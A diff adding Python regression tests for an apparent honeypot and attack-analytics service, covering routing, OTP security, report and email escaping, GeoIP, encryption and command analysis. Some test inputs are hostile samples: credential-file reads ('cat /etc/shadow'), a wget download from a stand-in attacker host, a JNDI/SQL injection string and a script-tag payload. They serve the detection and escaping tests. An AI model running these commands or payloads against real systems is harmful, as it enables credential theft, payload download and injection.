@@ -1,0 +1,271 @@
+"""Regression tests, one per defect found during the review."""
+
+import json
+
+import pytest
+
+from app.models import UserRole
+
+
+class TestRoutingAndResponses:
+    async def test_alert_stats_is_not_shadowed_by_alert_id(
+        self, client, auth_headers
+    ):
+        """/alerts/stats used to match /alerts/{alert_id:int} and 422."""
+        headers = await auth_headers(UserRole.ANALYST)
+        response = await client.get("/api/v1/alerts/stats", headers=headers)
+        assert response.status_code == 200
+        assert set(response.json()) >= {"new", "acknowledged", "resolved"}
+
+    async def test_health_endpoint_needs_no_query_parameter(self, client):
+        """`request` lacked a Request annotation, so /health returned 422."""
+        response = await client.get("/health")
+        assert response.status_code == 200
+        assert response.json()["status"] == "healthy"
+
+    async def test_security_headers_present(self, client):
+        response = await client.get("/health")
+        assert response.headers["X-Content-Type-Options"] == "nosniff"
+        assert response.headers["X-Frame-Options"] == "DENY"
+
+
+class TestExport:
+    async def test_json_export_does_not_raise_unbound_local(
+        self, client, auth_headers
+    ):
+        """`import json` inside a branch made `json` function-local, so the
+        default JSON branch raised UnboundLocalError before its own import."""
+        headers = await auth_headers(UserRole.ANALYST)
+        response = await client.post("/api/v1/export/?format=json", headers=headers)
+        assert response.status_code == 200
+        assert json.loads(response.text) == []
+
+    @pytest.mark.parametrize("fmt", ["json", "cef", "stix"])
+    async def test_every_format_renders(self, client, auth_headers, fmt):
+        headers = await auth_headers(UserRole.ANALYST)
+        response = await client.post(
+            f"/api/v1/export/?format={fmt}", headers=headers
+        )
+        assert response.status_code == 200
+
+    async def test_unknown_format_rejected(self, client, auth_headers):
+        headers = await auth_headers(UserRole.ANALYST)
+        response = await client.post(
+            "/api/v1/export/?format=yaml", headers=headers
+        )
+        assert response.status_code == 422
+
+
+class TestFilterValidation:
+    async def test_unknown_enum_filter_is_400_not_500(
+        self, client, auth_headers
+    ):
+        headers = await auth_headers(UserRole.ANALYST)
+        response = await client.get(
+            "/api/v1/sessions/?status=not-a-status", headers=headers
+        )
+        assert response.status_code == 400
+        assert "Expected one of" in response.json()["detail"]
+
+    async def test_like_wildcards_in_search_are_escaped(
+        self, client, auth_headers
+    ):
+        headers = await auth_headers(UserRole.ANALYST)
+        response = await client.get("/api/v1/sessions/?search=%25", headers=headers)
+        assert response.status_code == 200
+
+
+class TestHoneypotIngest:
+    async def test_ingest_requires_the_shared_token(self, client):
+        response = await client.post(
+            "/api/v1/sessions/ingest-internal?node_id=1", json={}
+        )
+        assert response.status_code == 401
+
+    async def test_ingest_rejects_a_wrong_token(self, client):
+        response = await client.post(
+            "/api/v1/sessions/ingest-internal?node_id=1",
+            json={},
+            headers={"X-Honeypot-Token": "not-the-token"},
+        )
+        assert response.status_code == 401
+
+
+class TestOTP:
+    async def test_codes_are_not_stored_in_plaintext(self, db_session, make_user):
+        from sqlalchemy import select
+
+        from app.models import OTPVerification
+        from app.services.otp import otp_service
+
+        user = await make_user(email="otp@example.com")
+        with pytest.MonkeyPatch.context() as mp:
+            mp.setattr(
+                "app.services.email.email_service.send_otp_email",
+                lambda *a, **k: True,
+            )
+            await otp_service.generate_and_send(db_session, user)
+
+        record = (
+            await db_session.execute(
+                select(OTPVerification).where(OTPVerification.user_id == user.id)
+            )
+        ).scalar_one()
+        assert len(record.otp_code) == 64
+        assert not record.otp_code.isdigit()
+
+    async def test_attempts_are_limited(self, db_session, make_user):
+        from app.services.otp import OTP_MAX_ATTEMPTS, otp_service
+
+        user = await make_user(email="brute@example.com")
+        with pytest.MonkeyPatch.context() as mp:
+            mp.setattr(
+                "app.services.email.email_service.send_otp_email",
+                lambda *a, **k: True,
+            )
+            await otp_service.generate_and_send(db_session, user)
+
+        for _ in range(OTP_MAX_ATTEMPTS):
+            result = await otp_service.verify(db_session, user.id, "000000")
+            assert result["valid"] is False
+
+        # OTP_MAX_ATTEMPTS was defined but never enforced, so codes could be
+        # brute-forced indefinitely.
+        final = await otp_service.verify(db_session, user.id, "000000")
+        assert "Too many" in final["reason"]
+
+    def test_codes_use_a_cryptographic_rng(self):
+        from app.services.otp import OTPService
+
+        codes = {OTPService._generate_code() for _ in range(200)}
+        assert all(len(c) == 6 and c.isdigit() for c in codes)
+        assert len(codes) > 150  # not obviously degenerate
+
+
+class TestReportEscaping:
+    def test_cef_extension_values_are_escaped(self):
+        from app.services.report_generator import report_generator
+
+        line = report_generator.generate_cef_report(
+            {
+                "attacker_ip": "1.2.3.4",
+                "session_uuid": "abc",
+                "protocol": "ssh",
+                "geo": {},
+            },
+            {"category": "exploitation", "detected_tools": ["evil=injected"]},
+        )
+        # The injected '=' must be escaped so it cannot forge a new CEF field.
+        assert "evil\\=injected" in line
+
+    def test_stix_pattern_quotes_are_escaped(self):
+        from app.services.report_generator import report_generator
+
+        bundle = report_generator.generate_stix_report(
+            {"attacker_ip": "1.2.3.4", "session_uuid": "s"},
+            {"category": "recon", "detected_tools": ["it's"], "mitre": {}},
+        )
+        parsed = json.loads(bundle)
+        patterns = [
+            o["pattern"] for o in parsed["objects"] if o["type"] == "indicator"
+        ]
+        assert any("it\\'s" in p for p in patterns)
+
+    def test_invalid_technique_ids_are_dropped(self):
+        from app.services.report_generator import report_generator
+
+        bundle = json.loads(
+            report_generator.generate_stix_report(
+                {"attacker_ip": "1.2.3.4", "session_uuid": "s"},
+                {
+                    "category": "recon",
+                    "mitre": {"techniques": [{"id": "NOT-A-TECHNIQUE", "name": "x"}]},
+                },
+            )
+        )
+        assert not [
+            o for o in bundle["objects"] if o["type"] == "attack-pattern"
+        ]
+
+
+class TestAlertEmailEscaping:
+    def test_attacker_controlled_values_are_escaped(self):
+        from app.services.alerting import alerting_service
+
+        body = alerting_service._format_email_body(
+            {
+                "severity": "critical",
+                "title": "<script>alert(1)</script>",
+                "attacker_ip": "1.2.3.4",
+            }
+        )
+        assert "<script>" not in body
+        assert "&lt;script&gt;" in body
+
+
+class TestGeoIP:
+    def test_missing_database_returns_unknown_not_fabricated_data(self):
+        """The fallback used to derive a country from an MD5 of the IP."""
+        from app.services.geoip import geoip_service
+
+        result = geoip_service.lookup("8.8.8.8")
+        assert result["country"] is None
+        assert result["lat"] is None
+        assert result["source"] == "unavailable"
+
+    def test_private_addresses_are_labelled(self):
+        from app.services.geoip import geoip_service
+
+        assert geoip_service.lookup("10.0.0.5")["source"] == "private_address"
+
+
+class TestEncryption:
+    def test_round_trip(self):
+        from app.core.encryption import decrypt_data, encrypt_data
+
+        assert decrypt_data(encrypt_data("cat /etc/shadow")) == "cat /etc/shadow"
+
+    def test_corrupt_ciphertext_raises_value_error(self):
+        from app.core.encryption import decrypt_data
+
+        with pytest.raises(ValueError):
+            decrypt_data("not-a-valid-token")
+
+
+class TestClassifierScaling:
+    def test_features_are_normalised_into_unit_range(self):
+        from app.ai.classifier import FeatureExtractor
+
+        features = FeatureExtractor.extract_from_raw(
+            packets=[{"direction": "inbound", "payload": "x" * 1400}] * 50,
+            commands=["uname -a", "cat /etc/passwd"],
+            duration=120.0,
+        )
+        assert features.shape == (1, len(FeatureExtractor.CICIDS_FEATURES))
+        assert features.min() >= 0.0 and features.max() <= 1.0
+
+    def test_verdicts_declare_their_model_provenance(self):
+        from app.ai.classifier import classifier
+
+        result = classifier.classify_raw([], ["ls"], 1.0)
+        assert result["model_source"] in ("synthetic", "pretrained")
+
+
+class TestNLPEngine:
+    def test_analysis_works_without_the_spacy_model(self):
+        """analyze_commands called self.nlp without ever loading it, so every
+        ingest raised "NoneType is not callable"."""
+        from app.ai.nlp_engine import nlp_engine
+
+        result = nlp_engine.analyze_commands(
+            ["nmap -sS 10.0.0.1", "wget http://evil.example/x.sh -O /tmp/x"]
+        )
+        assert "nmap" in result["tool_names"]
+        assert "10.0.0.1" in result["extracted_ips"]
+        assert result["extracted_urls"]
+
+    def test_payload_analysis_does_not_crash(self):
+        from app.ai.nlp_engine import nlp_engine
+
+        result = nlp_engine.analyze_payload("${jndi:ldap://x/a} union select")
+        assert 0.0 <= result["suspicion_score"] <= 1.0
